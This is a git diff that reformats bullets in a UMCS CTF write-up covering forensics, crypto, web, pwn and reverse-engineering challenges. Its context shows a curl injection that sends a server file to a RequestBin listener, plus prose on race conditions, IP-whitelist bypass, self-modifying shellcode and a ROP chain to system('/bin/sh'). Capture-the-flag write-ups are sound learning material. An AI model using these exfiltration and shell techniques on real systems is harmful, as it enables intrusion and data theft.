@@ -61,26 +61,27 @@ A suspicious **_broken.mp4_** file was suspected of containing a hidden flag. In
 
 **_Objective_**: Recover the hidden flag from a corrupted **_broken.mp4_** file provided during the forensic challenge
 **_Initial Observation:_**:
-• The file could not be played in any media player.
-• Tools like **_ffmpeg_** and **_exiftool_** were used for deeper inspection.
-• Manual binary inspection via hex editor suggested intentional tampering.
+
+- The file could not be played in any media player.
+- Tools like **_ffmpeg_** and **_exiftool_** were used for deeper inspection.
+- Manual binary inspection via hex editor suggested intentional tampering.
 
 ### Requirements
 
-• Knowledge of MP4 file structure (ftyp, moov, mdat atoms).
-• Familiarity with ffmpeg, exiftool, and hex editors for static analysis.
-• Understanding of video encoding schemes (H.264 in this case)
-• Ability to reconstruct or repair partial media file structures.
+- Knowledge of MP4 file structure (ftyp, moov, mdat atoms).
+- Familiarity with ffmpeg, exiftool, and hex editors for static analysis.
+- Understanding of video encoding schemes (H.264 in this case)
+- Ability to reconstruct or repair partial media file structures.
 
 ### Static Analysis
 
 1. Hex inspection & obtain a sample.
    Key points:
-   • **_ftypisom_** header, this indicate that it is ISO Base Media file MPEG-4
-   ![](./image/Picture10.png)
-   • **_H264 encoded format_**
-   ![](./image/Picture11.png)
-   To solve this, we thought of obtaining a sample for ease of comparison by recording with OBS since OBS allows to tweak the recording output format, so we screenrecorded under **_H264_** encoding and output as **_.mp4_** file
+   - **_ftypisom_** header, this indicate that it is ISO Base Media file MPEG-4
+     ![](./image/Picture10.png)
+   - **_H264 encoded format_**
+     ![](./image/Picture11.png)
+     To solve this, we thought of obtaining a sample for ease of comparison by recording with OBS since OBS allows to tweak the recording output format, so we screenrecorded under **_H264_** encoding and output as **_.mp4_** file
 2. Comparative Sample Analysis
    | Original | Sample |
    | -------- | ------- |
@@ -119,9 +120,9 @@ The challenge provided three main files: rooster.jpg, readme.txt, and iamthekidy
 
 ### Tools used
 
-• Sonic Visualiser
-• Notepad
-• Google
+- Sonic Visualiser
+- Notepad
+- Google
 
 ### Analysis & Flag Extraction
 
@@ -165,8 +166,8 @@ This website lets you use the curl command after filtering input with a basic bl
 
 ### Tools used
 
-• BurpSuite
-• RequestBin
+- BurpSuite
+- RequestBin
 
 ### Source Code Analysis
 
@@ -219,18 +220,22 @@ Note: here we use [RequestBin](https://requestbin.kanbanbox.com/) for this, but 
 https://requestbin.kanbanbox.com/XXXXXX -o /dev/null -X POST --data-binary @hopes_and_dreams
 ```
 
-https://requestbin.kanbanbox.com/XXXXXX  
-• This is the **_destination URL_**: RequestBin listener that logs incoming HTTP requests.
+https://requestbin.kanbanbox.com/XXXXXX
+
+- This is the **_destination URL_**: RequestBin listener that logs incoming HTTP requests.
 
 -o /dev/null
-• Tells **_curl_** to **_discard the response body_**. We don't care what the server sends back.
+
+- Tells **_curl_** to **_discard the response body_**. We don't care what the server sends back.
 
 -X POST
-• Forces the method to **_POST_**, which is important for sending data.
+
+- Forces the method to **_POST_**, which is important for sending data.
 
 **_--data-binary @hopes_and_dreams_**
-• This uploads a local file named **_hopes_and_dreams_** from the server.  
-• The @ tells curl to read the **_contents of the file_** and send it as the request body.
+
+- This uploads a local file named **_hopes_and_dreams_** from the server.
+- The @ tells curl to read the **_contents of the file_** and send it as the request body.
 
 ### Flag Extraction
 
@@ -250,15 +255,16 @@ This challenge presents an online reward system where users can collect daily bo
 
 ### Tools used
 
-• Python
+- Python
 
 ### Static Analysis
 
 Based on the source code, there are some interesting parts:
 
 1. Database Schema:
-   • **_users table_**: Stores username and balance
-   • **_redemptions table_**: Tracks which users have claimed their daily bonus
+
+   - **_users table_**: Stores username and balance
+   - **_redemptions table_**: Tracks which users have claimed their daily bonus
 
 2. Critical Vulnerability: The /claim endpoint contains a race condition:
 
@@ -360,10 +366,11 @@ else:
 ```
 
 The race condition works because:
-• The server first checks if a user has already claimed the bonus
-• Then separately updates the database to mark it as claimed
-• When multiple requests hit simultaneously, several can pass the initial check before any mark the bonus as claimed
-• Each successful request increases the user's balance by $1000
+
+- The server first checks if a user has already claimed the bonus
+- Then separately updates the database to mark it as claimed
+- When multiple requests hit simultaneously, several can pass the initial check before any mark the bonus as claimed
+- Each successful request increases the user's balance by $1000
 
 ### Flag Extraction
 
@@ -385,8 +392,8 @@ This challenge need to have knowledge of how does the api works and how to overr
 
 ### Tools used
 
-• Cloudflare Workers
-• Visual Studio Code
+- Cloudflare Workers
+- Visual Studio Code
 
 ### Analysis
 
@@ -471,8 +478,8 @@ export default {
 
 ### Takeaways
 
-• IP Whitelisting Alone is Not Secure – Additional protections are needed.  
-• Cloudflare Workers Can Bypass IP Bans – Useful for testing and authorized penetration testing.
+- IP Whitelisting Alone is Not Secure – Additional protections are needed.
+- Cloudflare Workers Can Bypass IP Bans – Useful for testing and authorized penetration testing.
 
 ### CREDITS
 
@@ -498,9 +505,9 @@ The challenge provided:
 
 ### Tools used
 
-• Python (for Morse code translation)  
-• Rail Fence cipher decoder (online tool)
-• Courier New font (to properly render ASCII art)
+- Python (for Morse code translation)
+- Rail Fence cipher decoder (online tool)
+- Courier New font (to properly render ASCII art)
 
 ### Analysis
 
@@ -509,9 +516,9 @@ The challenge provided:
 The file contained strange symbols (`🚂`, `🚆`, `🚋`), suggesting misinterpreted binary data or a custom encoding.
 Upon closer inspection, these symbols resembled Morse code when mapped to:
 
-• `🚂` → Dot (.)  
-• `🚋` → Dash (–)  
-• `🚆` → Separator ( )
+- `🚂` → Dot (.)
+- `🚋` → Dash (–)
+- `🚆` → Separator ( )
 
 Python Script for Morse Decoding:
 
@@ -562,22 +569,23 @@ HERE[.......]IS[.......]YOUR[.......]PRIZE[.......]E012D0A1FFFAC42D6AAE00C54078A
 ```
 
 2. Identifying the Cipher
-   The decoded message included:  
-   • "**_SAMUEL REALLY LIKES TRAIN_**" → Hinting at Rail Fence cipher (rail = train tracks). (Look also at the question given of the challenge 'gatekeeping')
-   • "**_FAVORITE NUMBER IS 8_**" → Should be the key for the cipher.
-   • "**_E012D0A1FFFAC42D6AAE00C54078AD3E_**" → A hexadecimal string identifying the GitHub Gist.
+   The decoded message included:
+
+   - "**_SAMUEL REALLY LIKES TRAIN_**" → Hinting at Rail Fence cipher (rail = train tracks). (Look also at the question given of the challenge 'gatekeeping')
+   - "**_FAVORITE NUMBER IS 8_**" → Should be the key for the cipher.
+   - "**_E012D0A1FFFAC42D6AAE00C54078AD3E_**" → A hexadecimal string identifying the GitHub Gist.
 
 3. Retrieving the GitHub Gist
-   • Using the hex string from the decoded message, we accessed the GitHub Gist at:
-   https://gist.github.com/umcybersec/e012d0a1fffac42d6aae00c54078ad3e
-   ![](./image/Picture35.png)
+   - Using the hex string from the decoded message, we accessed the GitHub Gist at:
+     https://gist.github.com/umcybersec/e012d0a1fffac42d6aae00c54078ad3e
+     ![](./image/Picture35.png)
 
-• The Gist contained what appeared to be ASCII art, but it was encoded with the Rail Fence cipher.
+- The Gist contained what appeared to be ASCII art, but it was encoded with the Rail Fence cipher.
 
 4. Applying the Rail Fence Cipher
 
-• The Rail Fence cipher is a transposition cipher that arranges text in a zigzag pattern across a specified number of "rails."
-• Using the hint that Samuel's favorite number is 8, we applied the Rail Fence decoder with **_8 rails_** and Offset = 0.
+- The Rail Fence cipher is a transposition cipher that arranges text in a zigzag pattern across a specified number of "rails."
+- Using the hint that Samuel's favorite number is 8, we applied the Rail Fence decoder with **_8 rails_** and Offset = 0.
 
 Decoding Process:
 
@@ -590,9 +598,9 @@ Decoding Process:
 
 ### Flag Extraction
 
-• After Rail Fence decryption, the result was properly formatted ASCII art.
-• When viewed with a monospaced font like Courier New, the ASCII art clearly displayed the flag.
-• Used Notepad to watch the flag in ASCII art view.
+- After Rail Fence decryption, the result was properly formatted ASCII art.
+- When viewed with a monospaced font like Courier New, the ASCII art clearly displayed the flag.
+- Used Notepad to watch the flag in ASCII art view.
 
 ![](./image/Picture37.png)
 
@@ -600,9 +608,9 @@ Flag: `umcs{willow_tree_campsite}`
 
 ### Takeaways
 
-• **Multi-Layer Encoding** – Data was hidden behind Morse code and a Rail Fence cipher.  
-• **Contextual Clues** – "Trains" and "8" were critical to solving the Rail Fence step.  
-• **Tool Flexibility** – Switching between Python scripting, and cipher tools was essential.
+- **Multi-Layer Encoding** – Data was hidden behind Morse code and a Rail Fence cipher.
+- **Contextual Clues** – "Trains" and "8" were critical to solving the Rail Fence step.
+- **Tool Flexibility** – Switching between Python scripting, and cipher tools was essential.
 
 # PWN
 
@@ -647,8 +655,8 @@ The program:
 1. Allocates 0x1000 bytes of executable memory at address 0x26e45000
 2. Reads user input into this memory
 3. Scans for specific byte patterns:
-   • **0x80cd**: int **0x80** instruction (32-bit syscall)
-   • **0x340f** and **0x050f**: Parts of the syscall instruction (64-bit syscall)
+   - **0x80cd**: int **0x80** instruction (32-bit syscall)
+   - **0x340f** and **0x050f**: Parts of the syscall instruction (64-bit syscall)
 4. If no forbidden patterns are found, executes the provided shellcode
 
 Running **checksec** on the binary, and we found that:
@@ -666,8 +674,9 @@ The real challenge here is that standard shellcode can't be used because it woul
 **Classic Technique: Self-modifying shellcode**
 
 Because the program only checks for forbidden bytes before execution — not during runtime — it's possible to write a shellcode that:
-• Writes the forbidden instruction (syscall) into memory dynamically.
-• Executes it after the check has already passed.
+
+- Writes the forbidden instruction (syscall) into memory dynamically.
+- Executes it after the check has already passed.
 
 Assembly Walkthrough
 
@@ -796,14 +805,14 @@ Flag: `umcs{shellcoding_78b18b51641a3d8ea260e91d7d05295a}`
 
 ### Takeaways
 
-• **Static Filters ≠ Runtime Security**
-Static byte filtering can be bypassed with runtime-generated instructions like self-modifying code.
+- **Static Filters ≠ Runtime Security**
+  Static byte filtering can be bypassed with runtime-generated instructions like self-modifying code.
 
-• **Self-Modifying Code is Powerful**
-Writing code that changes itself at runtime is a classic exploitation trick, especially when static analysis is the only check.
+- **Self-Modifying Code is Powerful**
+  Writing code that changes itself at runtime is a classic exploitation trick, especially when static analysis is the only check.
 
-• **Deep Understanding of Instruction Encoding**
-Knowing how assembly translates into machine bytes is crucial for developing filtered or stealthy shellcode.
+- **Deep Understanding of Instruction Encoding**
+  Knowing how assembly translates into machine bytes is crucial for developing filtered or stealthy shellcode.
 
 ## Liveleak
 
@@ -847,9 +856,9 @@ The function allocates a 64-byte stack buffer, but **fgets** reads up to 128 byt
 
 1. **Calculating the Offset**
    The overflow occurs after:
-   • 64 bytes of the buffer
-   • 8 bytes for the saved base pointer (rbp)
-   So the offset to the return address is 72 bytes.
+   - 64 bytes of the buffer
+   - 8 bytes for the saved base pointer (rbp)
+     So the offset to the return address is 72 bytes.
 
 payload = b'A' \* 72 # Exactly enough to reach the return address
 
@@ -863,10 +872,10 @@ Thus, when we reach and overwrite **RIP (Return Instruction Pointer)**, the prog
 
 In later explanation, when the program hits ret:
 
-• **ret** pops the first address **(POP_RDI)** and jumps there.
-• **POP_RDI** loads the next stack value **(puts_got)** into **RDI**.
-• **ret** pops again, now landing on **puts_plt**, which calls **puts()**.
-• After **puts** prints the leaked address, the program uses the next address **(main)** to restart.
+- **ret** pops the first address **(POP_RDI)** and jumps there.
+- **POP_RDI** loads the next stack value **(puts_got)** into **RDI**.
+- **ret** pops again, now landing on **puts_plt**, which calls **puts()**.
+- After **puts** prints the leaked address, the program uses the next address **(main)** to restart.
 
 This is how the ROP chain flows, the program executes it **step by step** as if you're chaining function calls.
 
@@ -882,20 +891,22 @@ So before calling **system()**, we must:
 3. Use this **libc_base** to compute the real **system()** and “/bin/sh” address.
 
 Choosing **system(“/bin/sh”)**:
-• Gain a shell
-• Use it to run command
-• Retrieve a flag
+
+- Gain a shell
+- Use it to run command
+- Retrieve a flag
 
 Leaking puts:
-• Always present in GOT (Global Offset Table)
-• Easy to leak via a ROP chain
-• Its offset inside libc is known, so once we leak it, we can compute all other important addresses
+
+- Always present in GOT (Global Offset Table)
+- Easy to leak via a ROP chain
+- Its offset inside libc is known, so once we leak it, we can compute all other important addresses
 
 3. Building the Leak Payload
-   • Leak **puts** real address
-   • Calculate **libc_base**
-   • Calculate **system()** and **“/bin/sh”**
-   • Call **system(“/bin/sh”)** to get a shell
+   - Leak **puts** real address
+   - Calculate **libc_base**
+   - Calculate **system()** and **“/bin/sh”**
+   - Call **system(“/bin/sh”)** to get a shell
 
 To leak puts, we created a ROP chain
 
@@ -1049,11 +1060,11 @@ Flag: `umcs{GOT_PLT_8f925fb19309045dac4db4572435441d}`
 
 ### Takeaways
 
-• NX makes shellcode injection impossible.
-• Modern exploits rely on ROP + libc functions instead.
-• Leaking a function address (like puts) is essential to calculate the randomized memory layout (bypassing ASLR).
-• Calling system("/bin/sh") is a reliable way to get shell access.
-• Once we have the shell, the flag is just one command away.
+- NX makes shellcode injection impossible.
+- Modern exploits rely on ROP + libc functions instead.
+- Leaking a function address (like puts) is essential to calculate the randomized memory layout (bypassing ASLR).
+- Calling system("/bin/sh") is a reliable way to get shell access.
+- Once we have the shell, the flag is just one command away.
 
 # Reverse Engineering
 
@@ -1079,9 +1090,10 @@ During analysis of the serever binary, we identified a simple TCP server written
 | Stripped       | ✅                                              |
 
 As the file was stripped, it has all its symbol names removed:
-• Function names (main, printf,...)
-• Variable names
-• Debugging info
+
+- Function names (main, printf,...)
+- Variable names
+- Debugging info
 
 ### Static Analysis
 
@@ -1107,11 +1119,12 @@ This function **receives raw data from the client** and determines the response 
 ![](./image/Picture50.png)
 
 Key Logic:
-• Use **strstr()** to **search for a specific request string**:
-`strstr(pcVar2, "GET /goodshit/umcs_server HTTP/13.37")`
-strstr(a, b) searches for the substing b inside the string a.
 
-• If not found (where strstr() returns **NULL**) -> and reply:
+- Use **strstr()** to **search for a specific request string**:
+  `strstr(pcVar2, "GET /goodshit/umcs_server HTTP/13.37")`
+  strstr(a, b) searches for the substing b inside the string a.
+
+- If not found (where strstr() returns **NULL**) -> and reply:
 
 ```
 HTTP/1.1 404 Not Found
@@ -1120,7 +1133,7 @@ Content-Type: text/plain
 Not here buddy
 ```
 
-• If the string is found, the server proceeds to open /flag and send its contents back to the client.
+- If the string is found, the server proceeds to open /flag and send its contents back to the client.
 
 ### Flag Extraction
 
@@ -1136,8 +1149,8 @@ Flag: `umcs{http_server_a058712ff1da79c9bbf211907c65a5cd}`
 
 ### Takeaways
 
-• As the binary was stripped, we should start our static analysis from the entry symbol
-• strstr() function check if the string literals is existed from user input
+- As the binary was stripped, we should start our static analysis from the entry symbol
+- strstr() function check if the string literals is existed from user input
 
 # UMCS CTF Preliminary Round Scoreboard
 
